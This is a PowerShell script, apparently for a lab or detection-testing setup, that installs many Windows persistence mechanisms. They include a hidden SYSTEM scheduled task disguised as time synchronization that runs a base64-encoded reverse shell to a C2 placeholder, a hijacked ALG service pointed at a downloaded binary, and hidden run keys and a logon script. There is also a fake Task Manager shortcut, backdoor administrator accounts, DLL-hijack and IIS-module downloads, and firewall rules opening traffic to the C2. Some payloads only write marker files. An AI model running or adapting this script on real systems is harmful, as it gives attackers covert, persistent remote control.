# Create a directory for the scripts and payloads
New-Item -Path "C:\Program Files\" -Name "Application Support" -ItemType "Directory"
New-Item -Path "C:\" -Name "Temp" -ItemType "Directory"

# Base script path and user
$scriptAndPayloadLocation = "C:\Program Files\Application Support"
$baseUrl = "http://mastervm03:9000"
$user = $Env:UserName

# Scheduled task
$taskScript = '$LHOST = "<C2_SERVER_IP_HERE>"; $LPORT = 9876; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()';
$taskBytes = [System.Text.Encoding]::Unicode.GetBytes($taskScript); # Convert the command to a byte array
$taskEncodedCommand = [Convert]::ToBase64String($taskBytes); # Encode the byte array to Base64
$arguments= "-NoProfile -WindowStyle Hidden -EncodedCommand $taskEncodedCommand"

$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$arguments"
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskSettings = New-ScheduledTaskSettingsSet -Compatibility Win8 -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$taskObject = New-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings
$taskName = "SynchronizeTimeAtBootup"
$taskPath = "\Microsoft\Windows\Time Synchronization\"
Register-ScheduledTask -TaskName $taskName -InputObject $taskObject -TaskPath $taskPath

# Service takeover (Change the bin path and user of a service)
$destination = "C:\Program Files\Application Support\AppSupportService.zip"
$extractPath = "C:\Program Files\Application Support\AppSupportService"

if (-not (Test-Path -Path (Split-Path -Path $destination -Parent))) { # Create the destination folder if it doesn't exist
    New-Item -ItemType Directory -Path (Split-Path -Path $destination -Parent)
}

Invoke-WebRequest -Uri "$baseUrl/AppSupportService.zip" -OutFile $destination # Download the .zip file
Expand-Archive -Path $destination -DestinationPath $extractPath # Unzip the file
Remove-Item -Path $destination # Delete the .zip file

New-Item -Path "C:\Program Files\Application Support\AppSupportService\" -Name "logs" -ItemType "Directory"
# Change the path of existing service
$serviceName = "ALG"
sc.exe config $serviceName obj= LocalSystem # Run as SYSTEM
sc.exe config $serviceName binpath=  "$scriptAndPayloadLocation\AppSupportService\appsupportservice.exe"
sc.exe config $serviceName start= auto
Start-Service -Name $serviceName

# Registry run key (User)
$userRunKeyCommand = 'Set-Content -Path "C:\Temp\performancereport.txt" -Value "System performance is suberb!";'
$userRunKeyBytes = [System.Text.Encoding]::Unicode.GetBytes($userRunKeyCommand) # Convert the command to a byte array
$userRunKeyEncodedCommand = [Convert]::ToBase64String($userRunKeyBytes) # Encode the byte array to Base64
$userRunkeyName = "Application Performance Monitor"
$userRunkeyValue = "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand $userRunKeyEncodedCommand" # Create the registry run key
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $userRunkeyName  -Value $userRunkeyValue -PropertyType "String"

# Registry run key (Computer)
$computerRunKeyCommand = 'Set-Content -Path "C:\Temp\startup.txt" -Value "Oh no! Looks like you found my secret file."'
$computerRunKeyBytes = [System.Text.Encoding]::Unicode.GetBytes($computerRunKeyCommand) # Convert the command to a byte array
$computerRunKeyEncodedCommand = [Convert]::ToBase64String($computerRunKeyBytes) # Encode the byte array to Base64
$computerRunkeyName = "Startup optimizer"
$computerRunkeyValue = "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand $computerRunKeyEncodedCommand" # Create the registry run key
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $computerRunkeyName -PropertyType "ExpandString" -Value $computerRunkeyValue

# Modified .lnk file (Shortcut)
$shortcutCommand = 'Set-Content -Path "C:\Temp\taskmaster.txt" -Value "Everything is not what it seems"; invoke-item C:\Windows\system32\Taskmgr.exe;'
$shortcutBytes = [System.Text.Encoding]::Unicode.GetBytes($shortcutCommand) # Convert the command to a byte array
$shortcutEncodedCommand = [Convert]::ToBase64String($shortcutBytes) # Encode the byte array to Base64
$shellObject = New-Object -ComObject WScript.Shell
$shortcut = $shellObject.CreateShortcut("C:\Users\$user\Desktop\Task Manager.lnk")
$arguments = "-WindowStyle Hidden -ec $shortcutEncodedCommand"
$iconLocation = "%windir%\system32\Taskmgr.exe"
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = $arguments
$shortcut.IconLocation = $iconLocation
$shortcut.WorkingDirectory = "C:\Users\$user"
$shortcut.Save()

# Add a regular account to the administrators group
$existingUsername = "annbro"
Add-LocalGroupMember -Group Administrators -Member $existingUsername

# Create a new administrator account
$newUsername = "thojon"
$newFullName = "Thomas Jones"
$password = "Securepassword!23" | ConvertTo-SecureString -AsPlainText -Force
New-LocalUser -FullName $newFullName -Name $newUsername -AccountNeverExpires -PasswordNeverExpires -Password $password
Add-LocalGroupMember -Group Administrators -Member $newUsername

# Persistence in UserInitLogonScript
$userInitScriptCommand = 'Set-Content -Path "C:\Temp\init.txt" -Value "Initialising C2 conn...I mean...initialising user preferences.."'
$userInitScriptBytes = [System.Text.Encoding]::Unicode.GetBytes($userInitScriptCommand) # Convert the command to a byte array
$userInitScriptEncodedCommand = [Convert]::ToBase64String($userInitScriptBytes) # Encode the byte array to Base64
$userInitScriptValue = "powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand $userInitScriptEncodedCommand"
New-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $userInitScriptValue  -PropertyType "String"

# Persistence through dll hijack
$dllTargetPath = "C:\Program Files (x86)\Microsoft\Edge\Application\profapi.dll"
Invoke-WebRequest -Uri "$baseUrl/profapi.dll" -OutFile $dllTargetPath # Download the script

# Persistence through Server Software Component: IIS Components
$iisModuleDll = "AuthenticationModule.dll"
$iisModuleDllTargetPath = "C:\inetpub\wwwroot\bin\$iisModuleDll"
$moduleName = "AuthenticationModule.AuthModule"
$moduleType = "AuthenticationModule.AuthModule"
New-Item -Path "C:\inetpub\wwwroot\" -Name "bin" -ItemType "Directory"
Invoke-WebRequest -Uri "$baseUrl/$iisModuleDll" -OutFile $iisModuleDllTargetPath # Download the script
Import-Module WebAdministration
Add-WebConfigurationProperty -Filter "system.webServer/modules" -PSPath "IIS:\" -Name "." -Value @{name=$moduleName; type=$moduleType}
iisreset

# Add a firewall rule to allow incoming and outgoing traffic to the C2 server
New-NetFirewallRule -Name '{b1c4c56c-b24f-43f3-bf8f-0694006cd2bd}' -DisplayName ' ' -Profile Any -Enabled True -Action Allow -Direction Inbound -RemotePort Any -LocalPort Any -RemoteAddress <C2_SERVER_IP_HERE>
New-NetFirewallRule -Name '{1cf7d2bf-c7c7-470f-9fd8-5b0a7fbebb57}' -DisplayName ' ' -Profile Any -Enabled True -Action Allow -Direction Outbound -RemotePort Any -LocalPort Any -RemoteAddress <C2_SERVER_IP_HERE>
